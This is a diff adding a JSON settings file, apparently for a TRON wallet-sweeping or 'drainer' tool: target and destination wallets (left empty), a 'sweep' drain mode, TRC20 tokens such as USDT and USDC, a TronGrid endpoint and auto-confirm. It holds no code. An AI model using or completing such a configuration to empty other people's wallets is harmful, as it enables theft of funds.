@@ -1,0 +1,12 @@
+{
+    "target_wallets": [],
+    "destination_wallet": "",
+    "drain_mode": "sweep",
+    "min_balance_trx": 100,
+    "include_trc20": true,
+    "trc20_tokens": ["USDT", "USDC", "BTT", "WIN", "JST"],
+    "rpc_endpoint": "https://api.trongrid.io",
+    "energy_optimize": true,
+    "auto_confirm": true,
+    "fee_limit": 10000000
+}
